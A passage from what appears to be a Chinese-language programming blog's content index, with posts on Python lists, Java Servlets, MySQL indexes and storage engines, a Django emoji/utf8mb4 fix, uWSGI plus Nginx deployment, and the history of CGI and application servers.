你可能会注意到的另一件事是并非所有数据或可以排序或比较。 例如，[None, &#39;hello&#39;, 10] 就不可排序，因为整数不能与字符串比较，而 None 不能与其他类型比较。 并且还存在一些没有定义顺序关系的类型。 例如，3+4j &lt; 5+7j 就不是一个合法的比较。 循环 list如果要对list实现类似Java那样的下标循环怎么办？Python内置的enumerate函数可以把一个list变成索引-元素对，这样就可以在for循环中同时迭代索引和元素本身： 123456&gt;&gt;&gt; for i, value in enumerate(['A', 'B', 'C']):... print(i, value)...0 A1 B2 C 通过索引获取子元素用索引来访问list中每一个位置的元素，记得索引是从0开始的： 12345678910&gt;&gt;&gt; classmates[0]'Michael'&gt;&gt;&gt; classmates[1]'Bob'&gt;&gt;&gt; classmates[2]'Tracy'&gt;&gt;&gt; classmates[3]Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;IndexError: list index out of range 当索引超出了范围时，Python会报一个IndexError错误，所以，要确保索引不要越界，记得最后一个元素的索引是len(classmates) - 1。 如果要取最后一个元素，除了计算索引位置外，还可以用-1做索引，直接获取最后一个元素： 12&gt;&gt;&gt; classmates[-1]'Tracy' 以此类推，可以获取倒数第2个、倒数第3个： 12345678&gt;&gt;&gt; classmates[-2]'Bob'&gt;&gt;&gt; classmates[-3]'Michael'&gt;&gt;&gt; classmates[-4]Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;IndexError: list index out of range 当然，倒数第4个就越界了。 子 list 获取123456789101112&gt;&gt;&gt; a = [0,1,2,3,4,5,6,7]&gt;&gt;&gt; a[:2][0, 1]# 从索引为 -1的元素开始取数据，到 list 的末尾，而索引为 -1的元素就是 7&gt;&gt;&gt; a[-1:][7]# 当第二个数字为负数，表示截取到该位置时停止，索引为-2表示从末尾往头部数，第 2 个元素（索引从 1 开始）# 索引从 -1 开始，-1、-2...&gt;&gt;&gt; a[:-2][0, 1, 2, 3, 4, 5]&gt;&gt;&gt; a[:-1][0, 1, 2, 3, 4, 5, 6] 列表作为栈使用列表方法使得列表作为堆栈非常容易，最后一个插入，最先取出（“后进先出”）。要添加一个元素到堆栈的顶端，使用 append() 。要从堆栈顶部取出一个元素，使用 pop() ，不用指定索引。例如 123456789101112131415&gt;&gt;&gt; stack = [3, 4, 5]&gt;&gt;&gt; stack.append(6)&gt;&gt;&gt; stack.append(7)&gt;&gt;&gt; stack[3, 4, 5, 6, 7]&gt;&gt;&gt; stack.pop()7&gt;&gt;&gt; stack[3, 4, 5, 6]&gt;&gt;&gt; stack.pop()6&gt;&gt;&gt; stack.pop()5&gt;&gt;&gt; stack[3, 4] 列表作为队列使用列表也可以用作队列，其中先添加的元素被最先取出 (“先进先出”)；然而列表用作这个目的相当低效。因为在列表的末尾添加和弹出元素非常快，但是在列表的开头插入或弹出元素却很慢 (因为所有的其他元素都必须移动一位)。 若要实现一个队列， collections.deque 被设计用于快速地从两端操作。例如 12345678910&gt;&gt;&gt; from collections import deque&gt;&gt;&gt; queue = deque([\"Eric\", \"John\", \"Michael\"])&gt;&gt;&gt; queue.append(\"Terry\") # Terry arrives&gt;&gt;&gt; queue.append(\"Graham\") # Graham arrives&gt;&gt;&gt; queue.popleft() # The first to arrive now leaves'Eric'&gt;&gt;&gt; queue.popleft() # The second to arrive now leaves'John'&gt;&gt;&gt; queue # Remaining queue in order of arrivaldeque(['Michael', 'Terry', 'Graham']) Reference https://www.liaoxuefeng.com/wiki/1016959663602400/1017092876846880 https://docs.python.org/zh-cn/3/library/stdtypes.html#range","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】Python Style Guide","date":"2019-11-01T08:20:12.000Z","path":"2019/11/01/【Python】Python-Style-Guide/","text":"Python Style Guide PEP 8 - https://legacy.python.org/dev/peps/pep-0008/ Google Python Style Guide - http://google.github.io/styleguide/pyguide.html","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【JavaEE】Java Servlet和 JSP（JavaServer Pages）","date":"2019-11-01T07:45:04.000Z","path":"2019/11/01/【JavaEE】servlet/","text":"狭义的Servlet是指Java语言中的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。 Servlet事实上，Servlet就是一个Java中的接口，里面有5个方法： 1234567891011121314// 负责Servlet初始化工作，容器在创建好Servlet对象之后，就会调用此方法，该方法接收一个ServletConfig类型的参数，Servlet容器通过这个参数，向Servlet传递初始化配置信息void init(ServletConfig config)// 返回容器调用init(ServletConfig config)方法时，传递给Servlet的ServletConfig对象ServletConfig getServlet(getServletConfig)// 返回一个字符串，其中包含关于Servlet的信息，比如，作者、版本和版权等信息String getServletInfo()// 负责响应用户的请求，当容器接收到客户端访问Servlet对象的请求时，就会调用此方法，容器会构造一个标识客户端请求信息的ServletRequest对象，与一个用于响应客户端的ServletResponse对象，作为参数传递给service()方法，在service()方法中，可以通过ServletRequest对象得到客户端的相关信息和请求信息，在对请求进行处理之后，调用ServletResponse对象的方法设置响应信息void service(ServletRequest request,ServletResponse response)// 赋值释放Servlet对象占用的资源，当Servlet对象被销毁时，容器会调用此方法void destroy() 那 Servlet是干嘛的？很简单，接口的作用是什么？规范呗！ Servlet接口定义的是一套处理网络请求的规范，所有实现Servlet的类，都需要实现这个接口的五个方法，其中最主要的是两个生命周期方法 init()和destroy()，还有一个处理请求的service()，也就是说，所有实现servlet接口的类，或者说，所有想要处理网络请求的类，都需要回答这三个问题： 你初始化时要做什么 你销毁时要做什么 你接受到请求时要做什么 既然，Servlet是一个规范，那实现了 Servlet 的类，就能处理请求了吗？ 答案是，不能。 你可以随便谷歌一个Servlet的hello world教程，里面都会让你写一个Servlet，相信我，你从来不会在Servlet中写什么监听8080端口的代码，Servlet不会直接和客户端打交道！ 那请求怎么来到Servlet呢？答案是Servlet容器（Servlet Container），比如我们最常用的Apache Tomcat。 同样，你可以随便谷歌一个Servlet的hello world教程，里面肯定会让你把Servlet部署到一个容器中，不然你的Servlet压根不会起作用。 Tomcat才是与客户端直接打交道的家伙，他监听了端口，请求过来后，根据url等信息，确定要将请求交给哪个Servlet去处理，然后调用那个Servlet的service方法，service方法返回一个response对象，Tomcat再把这个response返回给客户端。 等Spring家族出现后，Servlet开始退居幕后，取而代之的是方便的SpringMVC。SpringMVC的核心组件DispatcherServlet其实本质就是一个Servlet。但它已经自立门户，在原来HttpServlet的基础上，又封装了一条逻辑。 Web container（Servlet container）As we see here, the user/client can only request static webpage from the server. This is not good enough, if the user wants to read the web page based on his input. The basic idea of Servlet container is using Java to dynamically generate the web page on the server side. So servlet container is essentially a part of a web server that interacts with the servlets. 在JSP技术推出后，管理和运行Servlet和JSP的容器也称为Web container（Web容器）。 First Servlet1234567891011121314151617181920212223242526272829303132333435363738394041// importing the javax.servlet package // importing java.io package for PrintWriter import javax.servlet.*; import java.io.*; // now creating a servlet by implementing Servlet interface public class LifeCycleServlet implements Servlet &#123; ServletConfig config = null; // init method public void init(ServletConfig sc) &#123; config = sc; System.out.println(\"in init\"); &#125; // service method public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123; res.setContenttype(\"text/html\"); PrintWriter pw = res.getWriter(); pw.println(\"&lt;h2&gt;hello from life cycle servlet&lt;/h2&gt;\"); System.out.println(\"in service\"); &#125; // destroy method public void destroy() &#123; System.out.println(\"in destroy\"); &#125; public String getServletInfo() &#123; return \"LifeCycleServlet\"; &#125; public ServletConfig getServletConfig() &#123; return config; // getServletConfig &#125; &#125; JSP由于Servlet并不擅长往浏览器输出HTML页面，所以出现了JSP。 JSP将Java代码和特定变动内容嵌入到静态的页面中，实现以静态页面为模板，动态生成其中的部分内容。JSP引入了被称为“JSP动作”的XML标签，用来调用内建功能。 与 JSP 的关系Java服务器页面（JSP）是HttpServlet的扩展。由于HttpServlet大多是用来响应HTTP请求，并返回Web页面（例如HTML、XML），所以不可避免地，在编写servlet时会涉及大量的HTML内容，这给servlet的书写效率和可读性带来很大障碍，JSP便是在这个基础上产生的。其功能是使用HTML的书写格式，在适当的地方加入Java代码片段，将程序员从复杂的HTML中解放出来，更专注于servlet本身的内容。 Reference https://en.wikipedia.org/wiki/Java_servlet https://en.wikipedia.org/wiki/JSP https://docs.oracle.com/cd/E14571_01/web.1111/e13712/basics.htm#WBAPP130 https://www.geeksforgeeks.org/starting-first-servlet-application/ https://dzone.com/articles/what-servlet-container servlet的本质是什么，它是如何工作的？ - https://www.zhihu.com/question/21416727 https://blog.csdn.net/weixin_43869318/article/details/94054315 https://www.zhihu.com/question/19998865/answer/29395327 https://confluence.shopee.io/display/LABS/1.1+Life+cycle+of+a+page+load","comments":true,"categories":[{"name":"JavaEE","slug":"JavaEE","permalink":"http://swsmile.info/categories/JavaEE/"}],"tags":[{"name":"Java EE","slug":"Java-EE","permalink":"http://swsmile.info/tags/Java-EE/"}]},{"title":"【Database】聚集索引（Clustered Index）与非聚集索引（Non-clustered Index）","date":"2019-10-31T13:06:20.000Z","path":"2019/10/31/【Database】聚集索引（Clustered-Index）与非聚集索引（Non-clustered-Index）/","text":"DB 索引数据的存储方式 - 聚集索引（Clustered Index）与非聚集索引（Non-clustered Index） 索引数据的存储方式 - 聚集索引（聚簇索引，Clustered Index）聚集索引（clustered index），也称为聚簇索引。 聚簇索引并不是一种单独的索引类型，而是一种索引数据的存储方式。 当表有聚簇索引时，它的行数据实际上存储在索引的叶子页（leaf page）中。因为无法同时把数据行存放在两个不同的地方，所以一张表只能有一个聚簇索引。 对于采用聚簇索引的存储引擎（比如MySQL的InnoDB），表中行的物理存储顺序与索引顺序是一致的，即：只要索引是相邻的，那么对应的数据一定也是相邻地存储在磁盘上的。 下图展示了聚簇索引的记录是如何存放的。注意到，节点页只包含了索引列，叶子页包含该行的全部数据，这是B+Tree的数据结构： 聚集索引通过主键聚集数据，上图中的“被索引的列”就是主键列。这意味着，聚集索引表同时也是数据表。 如果没有定义主键，InnoDB会选择一个唯一的非空索引代替。如果没有这样的索引，InnoDB会隐式定义一个主键来作为聚簇索引。 与非聚集索引相比，聚集索引通常提供更快的数据访问速度，且更适用于很少对基表进行增删改操作的场景。 优点聚簇的数据有一些重要的优点： 可以把相关数据保存在一起。例如实现用户信息列表查询时，可以根据用户ID来聚集数据，这样只需要从磁盘读取少数的数据页就能获取多个用户的完整信息了（因为用户信息行数据的存储是基于用户 ID 连续存储的）。如果没有聚簇索引，则查询用户信息列表可能要进行多次磁盘 I/O（因为每个用户的用户信息数据在磁盘中存储的位置都是随机的） 数据访问更快。聚簇索引将索引和数据保存在同一个B+Tree中，因此从聚簇索引（或者说B+Tree）中获取数据通常比在非聚簇索引中查找要快（因为在非聚簇索引对应的索引表中，只存储了数据存储对应的地址，而不是存储数据本身）。 使用覆盖索引扫描的查询可以直接使用页节点中的主键值。 缺点如果设计表和查询时能充分利用上面的优点，就能极大地提升性能。但是，聚簇索引也有一些缺点： 聚簇数据最大限度地提高了I/O密集型应用的性能，但如果数据全部放在内存中，则访问的顺序就没那么重要了，聚簇索引也就没什么优势了。 插入速度严重依赖于插入顺序。按照主要的顺序插入是加载数据到聚集索引表中速度最快的方式。但如果不是按照主键顺序加载数据，那么在加载完成后最好使用optimize table命令重新组织一下表。 更新聚簇索引列的代价很高，因为会强制聚集索引表将每个被更新的行移动到新的位置。 基于聚簇索引的表插入新行，或者主键被更新导致需要移动行的时候，可能面临”页分裂（page split）“的问题。当行的主键值要求必须将这一行插入到某个已满的页中时，存储引擎会将该页分裂成两个页面来容纳该行，这就是一次分裂操作。页分裂会导致表占用更多的磁盘空间。 聚簇索引可能导致全表扫描变慢，尤其是行比较稀疏，或者由于页分裂导致数据存储不连续的时候。 聚簇索引中的二级索引（注意，聚簇索引中的二级索引是一个非聚簇索引）可能会比较大，因为在二级索引的叶子节点中包含了该行对应的主键。 聚簇索引中的二级索引的访问需要两次索引查找，而不是一次。因为，二级索引中的叶子节点保存的不是该行的物理存储地址（在非聚集索引中，二级索引中的叶子节点保存的是该行的物理存储地址），而是该行的主键值。这意味着，通过二级索引查找行时，存储引擎需要找到二级索引的叶子节点以获得对应的主键值，然后根据这个值去聚簇索引中查找到对应的行数据。 索引数据的存储方式 - 非聚集索引（非簇索引，Non-clustered Index）非聚集索引（non-clustered index），也叫非簇索引。 对于采用非聚簇索引的存储引擎，表中数据行的物理存储顺序与索引顺序无关，叶子结点包含索引字段值及指向数据页数据行的逻辑指针，其行数量与数据表行数据量一致。 非聚集索引索引主键 - 主键索引（Primary Index）在下图中，表一共有三列，假设以 col1 为主键，可以看出，该非聚集索引的叶子节点中保存的实际上是指向存放数据的物理块的指针。 非聚集索引索引非主键 - 辅助索引（Secondary Index）以对列 col2 （非主键列）进行索引为例。在这个非聚集索引（同时也是一个辅助索引（Secondary Index））中，每一个叶子节点中仅仅包含行号（row number），且叶子节点按照col2值的大小顺序进行存储。 注意到，数据表的数据存储顺序也与索引顺序无关。","comments":true,"categories":[{"name":"Database","slug":"Database","permalink":"http://swsmile.info/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://swsmile.info/tags/Database/"}]},{"title":"【Django】通过 ORM 访问 MySQL，插入 Emoji 报错","date":"2019-10-31T12:24:45.000Z","path":"2019/10/31/【Django】通过-ORM-访问-MySQL，插入-Emoji-报错/","text":"Problem12345678&gt;&gt;&gt; paras = &#123;u'name': u'\\U0001f600'&#125;&gt;&gt;&gt; from core import models&gt;&gt;&gt; models.Channel.objects.create(**paras)Traceback (most recent call last): ... File \"/Library/Python/2.7/site-packages/pymysql/err.py\", line 109, in raise_mysql_exception raise errorclass(errno, errval)InternalError: (1366, u\"Incorrect string value: '\\\\xF0\\\\x9F\\\\x98\\\\x80' for column 'name' at row 1\") 通过 ORM插入一条数据，在其中的一个类型为varchar的字段中插入一个 Emoji 表情，我插的是😀（对应的字符串为u&#39;\\U0001f600&#39;），插入后：提示以下错误： 1&#123;InternalError&#125;(1366, u\"Incorrect string value: '\\\\xF0\\\\x9F\\\\x98\\\\x80' for column 'name' at row 1\") Solition查看字符集（Charater Set）1SHOW VARIABLES WHERE Variable_name LIKE 'character\\_set\\_%' OR Variable_name LIKE 'collation%'; 修改字符集123456# For each database:ALTER DATABASE &#123;your_db_name&#125; CHARACTER SET = utf8mb4 COLLATE utf8mb4_unicode_ci;# For each table:ALTER TABLE &#123;your_tb_name&#125; CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;# For each column:ALTER TABLE &#123;your_tb_name&#125; CHANGE &#123;your_column_name&#125; name VARCHAR(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL; 重启 MySQL1$ mysql.server restart 查看字符集（Charater Set）1SHOW VARIABLES WHERE Variable_name LIKE 'character\\_set\\_%' OR Variable_name LIKE 'collation%'; Reference http://blog.manbolo.com/2014/03/31/using-emojis-in-django-model-fields https://exana.io/community/a-helping-hand/2016/08/23/django-utf8mb4-selected-columns.html","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【MySQL】MySQL 的存储引擎（Storage Engines）- MyISAM 与 InnoDB","date":"2019-10-31T11:34:19.000Z","path":"2019/10/31/【MySQL】MySQL-的存储引擎（Storage-Engines）-MyISAM-与-InnoDB/","text":"MySQL 有两种存储引擎（Storage Engines）： InnoDB’s MyISAM MyISAMMyISAM不支持聚簇索引，因此，MyISAM中的主键索引（Primary Index） 和辅助索引（Secondary Index），都是非聚集索引（Non-clustered Index）。 在MyISAM的B+Tree的叶子节点上的data域中，并不是保存数据本身，而是保存数据存放在磁盘中的地址。 MyISAM按照数据插入的顺序存储在磁盘上，如下图所示，左边为行号（row number），从0开始。因为元组的大小固定，所以MyISAM很容易的从表的开始位置找到某一特定行的位置。 MyISAM中的主键索引（Primary Index） - 非聚集索引（Non-clustered Index）MyISAM建立的基于 col1 为主键的主键索引大致如下图所示，索引中每一个叶子节点仅仅包含行号（row number），且叶子节点按照col1的顺序存储。 因此，由于MyISAM中的主键索引（Primary Index）是非聚集索引（Non-clustered Index），因此数据表中数据存储顺序与索引顺序无关，而与数据的插入顺序有关。 我们换一种图的表达形式。在下图中，表一共有三列，假设以 col1 为主键，可以看出，MyISAM的叶子节点中保存的实际上是指向存放数据的物理块的指针。从MYISAM存储的物理文件看出，MyISAM引擎的索引文件（.MYI）和数据文件（.MYD）是相互独立的，索引文件仅仅保存数据记录的地址。 MyISAM中的辅助索引（Secondary Index） - 非聚集索引（Non-clustered Index）以对列 col2 进行索引为例。在MyISAM的辅助索引（Secondary Index）中，每一个叶子节点中仅仅包含行号（row number），且叶子节点按照col2值的大小顺序进行存储。 因此，由于MyISAM中的辅助索引（Secondary Index）是非聚集索引（Non-clustered Index），因此数据表的数据存储顺序也与索引顺序无关， InnoDBInnoDB中的主键索引（Primary Index） - 聚集索引（Clustered Index）下图展示了InnoDB中的主键索引（Primary Index）的记录是如何存放的。注意到，节点页只包含了索引值，叶子页包含行的全部数据。整个主键索引是一个B+Tree的数据结构： 事实上，InnoDB将通过主键聚集所有数据，上图中的“被索引的列”就是主键列。如果没有定义主键，InnoDB会选择一个唯一的非空索引代替。如果没有这样的索引，InnoDB会隐式定义一个主键来作为聚簇索引。 因此，因为InnoDB的数据文件本身要按主键聚集，所以InnoDB要求表必须有主键（MyISAM可以没有）。 在InnoDB中，表数据文件本身就是按B+Tree组织的一个索引结构，这棵树的叶子节点的data域保存了整张表的完整的数据记录。这个索引的key是数据表的主键，因此InnoDB表数据文件本身就是主索引。 上图展示了一个 InnoDB 表的索引。可以看到，InnoDB索引的每一个叶子节点都包含了主键值、事务ID、用于事务和MVCC的回流指针以及所有的剩余列（在这个例子中是col2）。 InnoDB中的辅助索引（Secondary Index） - 非聚集索引（Non-clustered Index）InnoDB辅助索引的叶子节点中存储的不是”行指针“，而是主键值，并以此作为指向行的“指针”。这样的策略减少了当出现行移动或者数据页分裂时辅助索引的维护工作。使用主键值当作指针会让辅助索引占用更多的空间，换来的好处是，InnoDB在移动行时无须更新辅助索引中的这个“指针”。 下图展示了基于col2的辅助索引。每一个叶子节点都包含了索引列（这里是col2）和主键值（col1）。 InnoDB与MyIASM索引和数据布局对比下图对比InnoDB和MyISAM的主键索引与辅助索引： 可以看到，InnoDB的的辅助索引的叶子节点存放的是KEY字段加主键值。因此，通过辅助索引查询首先查到是主键值，然后InnoDB再根据查到的主键值通过主键索引找到相应的数据块。 而MyISAM的辅助索引叶子节点存放的还是列值与行号的组合，叶子节点中保存的是数据的物理地址。所以可以看出MYISAM的主键索引和辅助索引没有任何区别，主键索引仅仅只是一个叫做PRIMARY的唯一、非空的索引，且MYISAM引擎中可以不设主键。 Reference 《High Performance MySQL》 https://www.xaprb.com/blog/2006/07/04/how-to-exploit-mysql-index-optimizations/ https://www.jianshu.com/p/54c6d5db4fe6","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【Django】Django 项目部署到 uWSGI + Nginx 作为生产环境","date":"2019-10-28T13:07:48.000Z","path":"2019/10/28/【Django】Django-uWSGI-Nginx-配置/","text":"Workflow当客户端发出一个 HTTP 请求后，是如何转到我们的应用程序处理并返回的呢？ 我根据其架构组成的不同将这个过程的实现分为两种情况： 两级结构在两级结构中： uWSGI可以作为WSGI Server（WSGI 服务器），它基于了 HTTP 协议、 WSGI 协议和 usgi 协议； Flask应用可以作为 WSGI Application，基于 WSGI 协议实现。 当有客户端发来请求，uWSGI接受请求，调用 WSGI Application （或者说Flask应用）。当WSGI Application处理完成后，将结果返回给uWSGI，uWSGI构造相应的 HTTP Response，最终将结果返回给客户端。 通常来说，Flask等Web框架会自己附带一个 WSGI 服务器(这就是 Flask 应用可以直接启动的原因)，但是这只是在开发阶段被用到而言。在生产环境中，仍然需要将 Flask 部署到一个高性能的 WSGI Server 中，比如 uWSGI。 三级结构在三级结构中： uWSGI Server 作为中间件，它基于WSGI 协议与Nginx通信，同时与实现了 WSGI 协议的 WSGI Application（比如一个 Flask Application）进行通信 当有客户端发来请求，Nginx先做处理静态资源（静态资源是Nginx的强项），无法处理的动态请求以 WSGI 协议的格式转发给 WSGI Application（比如一个 Flask Application）。 这里，我们多了一层反向代理有什么好处？ 提高Web server性能（uWSGI处理静态资源不如nginx）nginx会在收到一个完整的http请求后再转发给wWSGI) Nginx可以做负载均衡（客户端是和Nginx交互而不是uWSGI），以提升高可用 Django 项目中设置settings.py123# settings.pyDEBUG = FalseALLOWED_HOSTS = ['*',] List all dependencies1$ pip freeze &gt; plist.txt 处理静态文件修改settings.py文件 1STATIC_ROOT='/var/www/dailyfresh/static/' 收集所有静态文件到static_root指定目录 1python manage.py collectstatic 生产环境中安装依赖拷贝源代码至生产环境Create a virtual environment12$ virtualenv task2$ source bin/activate 在生产环境安装 Dependencies1$ pip install -r plist.txt 安装 uWSGIInstall uWSGI in the virtualenv 1$ pip install uwsgi 安装 Nginx配置生产环境配置并启动 uWSGI【方法 1】 - 通过指定参数直接启动 uWSGI配置并启动 uWSGI。此处，假定的我的django项目位置为：/Users/wei.shi/Desktop/untitled1 1$ uwsgi --http :8001 --chdir /Users/wei.shi/Desktop/untitled1 --wsgi-file untitled1/wsgi.py --master --processes 4 --threads 2 --stats 127.0.0.1:9191 --socket :8002 访问127.0.0.1:8001，以测试 uWSGI 是否正常启动。 常用选项： http ： 协议类型和端口号 processes ： 开启的进程数量 workers ： 开启的进程数量，等同于processes（官网的说法是spawn the specified number ofworkers / processes） chdir ： Django 项目的根目录（chdir to specified directory before apps loading） wsgi-file ：Django 项目中帮自动生成的 wsgi.py 文件的路径（在我们通过Django创建{your project name]项目时，在子目录{your project name]下已经帮我们生成的 wsgi.py文件） stats ： 在指定的地址上，开启状态服务（enable the stats server on the specified address） threads ： 运行线程（run each worker in prethreaded mode with the specified number of threads） master ： 允许主进程存在（enable master process） daemonize ： 使进程在后台运行，并将日志打到指定的日志文件或者udp服务器（daemonize uWSGI）。实际上最常用的，还是把运行记录输出到一个本地文件上。 pidfile ： 指定pid文件的位置，记录主进程的pid号。 vacuum ： 当服务器退出的时候自动清理环境，删除unix socket文件和pid文件（try to remove all of the generated file/sockets） 【方法 2】 - 通过指定配置文件路径启动 uWSGIuWSGI支持多种类型的配置文件，如xml，ini等。此处，使用ini类型的配置。 创建一个名为myweb_uwsgi.ini的文件： 123456789101112131415161718192021222324# myweb_uwsgi.ini file[uwsgi]# Django-related settingssocket = :8001http = :8002# the base directory (full path)chdir=/Users/wei.shi/Desktop/untitled1/# Django s wsgi filewsgi-file=untitled1/wsgi.py# process-related settings# mastermaster= true# maximum number of worker processesprocesses= 4# ... with appropriate permissions - may be needed# chmod-socket = 664# clear environment on exitvacuum = true 启动uwsgi： 1$ uwsgi --ini myweb_uwsgi.ini Nginx配置 Nginx再接下来要做的就是修改nginx.conf配置文件。打开/etc/nginx/nginx.conf文件，添加如下内容。 123456789101112131415161718192021server &#123; listen 8099; server_name 127.0.0.1 charset UTF-8; access_log /var/log/nginx/myweb_access.log; error_log /var/log/nginx/myweb_error.log; client_max_body_size 75M; location / &#123; include uwsgi_params; uwsgi_pass 127.0.0.1:8001; uwsgi_read_timeout 2; &#125; location /static &#123; expires 30d; autoindex on; add_header Cache-Control private; alias /Users/wei.shi/Desktop/untitled1/static/; &#125; &#125; listen 指定的是nginx代理uwsgi对外的端口号。 Nginx 操作查看 Bginx 是否已经启动 1$ ps -ef|grep nginx 启动Nginx 1$ sudo nginx -c /etc/nginx/nginx.conf 访问127.0.0.1:8099。 重启Nginx 1$ nginx -s reload 关闭Nginx 1$ nginx -s stop","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"},{"name":"Nginx","slug":"Django/Nginx","permalink":"http://swsmile.info/categories/Django/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"http://swsmile.info/tags/Nginx/"},{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【HTTP】Web Server（Web 服务器）、Web Application Server（Web 应用服务器）和 CGI（Common Gateway Interface）的故事","date":"2019-10-28T11:40:06.000Z","path":"2019/10/28/【HTTP】Web-Server-和-CGI/","text":"Web Server（Web 服务器）在网络刚刚盛行的年代（Web 1.0），绝大部分的 Web 资源都是静态的。这意味着，你访问 www.example.com/a.html，你就可以访问 a页面，而如果访问 www.example.com/b.html，你就可以访问 b页面。显然，信息量是单向的，即网站上有什么，你就只能看什么，而不能修改网站的内容。我们通常把它称为静态网站。 狭义的Web Server（Web 服务器）概念中，Web Server只能处理静态页面。 典型的Web Server的例子，就是 Apache HTTP Server，Nginx 还有 LightHttpd。 随着互联网的发展，我们更希望访问一个动态网站（Web 1.5），即可以根据用户传入的信息，动态地生成网页的内容。 这时候，我们就需要一个程序来帮忙处理动态请求（如返回特定用户的信息、获取当前时间等），而静态资源的请求，依然由Web Server来负责。 Web服务器程序会将动态请求转发给帮助程序（helper application），帮助程序处理后，返回处理后的静态结果给Web服务器程序。这样，就避免了 Web 服务器程序需要处理动态页面的问题，如下图： 统一的帮助程序 - CGI （Common Gateway Interface）随着构建动态网站的需求越来越多，而在上面的这个帮助程序（helper application）中，无论我们希望生成怎么样的动态页内容，有一部分工作的处理逻辑都是一样的，比如说HTTP Request的解析，或者HTTP Reponse 的 Header。也就是说，无论我们怎么实现我们的动态网站的功能，你的程序需要解析HTTP请求，我的程序也需要解析。 因此，自然有人会想到 DRY（Don’t Repeat Yourself）原则，即将HTTP Request 的参数解析逻辑放到一个通用的帮助程序中，这个通用的帮助程序就是CGI （Common Gateway Interface）。CGI 其实就是上图中的帮助程序（helper application）。 CGI 即 Common Gateway Interface，译作“通用网关接口”。CGI是一种比较原始的开发动态网站的方式。比如用 C++写的一个第三方库 Cgicc。 最终。我们仅仅需要关注业务逻辑的编写。 Django 是一个在 Python 世界中的Web 框架（类似于 Java 中的 Spring Boot 或者C#的 ASP.NET）。我们事实上可以通过使用 Apache HTTP Server的帮助程序来实现 Apache HTTP Server 能够处理动态请求（其实，严格来说，是当 Apache 接收到了静态资源请求时，就会自己去处理，比如请求 HTML 文件、CSS 文件、JS 文件等；当 Apache 接收到了动态请求时，它会转发这个请求给它的帮助程序来进行处理），这个帮助程序称为 mod_wsgi，see https://docs.djangoproject.com/en/2.2/howto/deployment/wsgi/modwsgi/ for more details。 调用CGI回到上面的图，当 Web server 收到用户的请求后，Web server会解析这个 HTTP Request，然后把这个请求的各种参数写进进程的环境变量，比如REQUEST_METHOD，PATH_INFO之类的。 之后呢，Web server会调用CGI帮助程序来处理这个请求，这个帮助程序也就是我们的CGI程序了。它会负责生成动态内容，然后返回给Web server，再由Web server转交给客户端。 服务器和CGI程序之间通信，一般是通过进程的环境变量和管道。具体来说，在Web server调用CGI程序之前，会把各类HTTP请求中的信息以环境变量的方式写入操作系统。CGI程序本质是操作系统上一个普通的可执行程序，它可以通过语言本身库函数来获取环境变量，从而获得数据输入。 除环境变量外，另外一个CGI程序获取数据的方式就是标准输入（stdin）。如当POST请求Web server的一个URL时，Web server会将POST中的数据传入CGI的标准输入。 CGI的不足这样做虽然很清晰，但缺点也很明显，就是每次有 HTTP 请求时，Web server都需要fork出一个新的 CGI 进行，这意味着每次都会有一个新的进程产生，因此开销还是比较大的。 原因在于，CGI程序是一个独立的程序，它是可以独立运行的（在提供HTTP请求的情况下），它可以用任何语言来写，包括perl，C，Lua，Python等等。所以对于一个程序，服务器只能以fork and exec的方式来调用它了。 FastCGI（FCGI）时势造英雄，FastCGI（简称FCGI）技术应运而生。简单来说，其本质就是一个常驻内存的进程池技术，由调度器负责将传递过来的CGI请求发送给处理CGI的handler进程来处理。在一个请求处理完成之后，该处理进程不销毁，继续等待下一个请求的到来。 当然FCGI其实也并不是什么惊世骇俗的创意，很容易联想到的解决思路。资源池是后台性能优化中的常见套路。Java中的Servlet技术也是一种常驻内存的网关通信技术，只不过它采用的是多线程而非进程。 Application Server（应用服务器） - 现代 CGI由于现代网站绝大部分均为动态网站，因此有时这个生成返回数据的“帮助程序”（CGI）就内置在了 Web server 里面，最终 CGI 的概念就不太被提及了。 而从广义的 CGI 的概念来说，所有能动态处理HTTP 请求的 Server（服务器）都可以称为 CGI，只不过我们不太习惯使用CGI 这个词。通常我们更多的将其称为 Application Server（应用服务器）。 而比较严格的来说，Web Server（Web 服务器）只能处理静态的HTTP 请求，而Application Server（应用服务器）能动态地处理HTTP 请求。 虽然，有时我们说的Web Server，其实是指 Application Server。在这个上下文中，Web Server就可以动态地处理HTTP 请求了。 而且，有的Web Server提供了 plugins，以支持脚本语言来动态生成 HTTP 内容，比如PHP、Perl 之类。或者，Web Server中就内置了一个 Application Server。比如，比如 IIS（内置了.NET Runtime以运行 ASP.NET Application），提供给 Java EE的 Tomcat。 个人而言，更偏向于把 Application Server和Web Server区分开来，则交互关系如下所示： 123+--------+ +------------+ +--------------------+| Client | --&gt; | Web Server | --&gt; | Application Server |+--------+ +------------+ +--------------------+ Example在 Python 中，Gunicorn and uWSGI就是Application Server； 在 Ruby 中，Unicorn, Puma and Passengee就是Application Server； 在 Java Web中，Application Server包括 Web container（或称为servlet container，支持 servlet 和 JSP）、EJB container： 典型的Web container，包括 Apache Tomcat、GlassFish from Oracle、Jetty from the Eclipse Foundation、WildFly (formerly JBoss Application Server) Web Application在现代Web 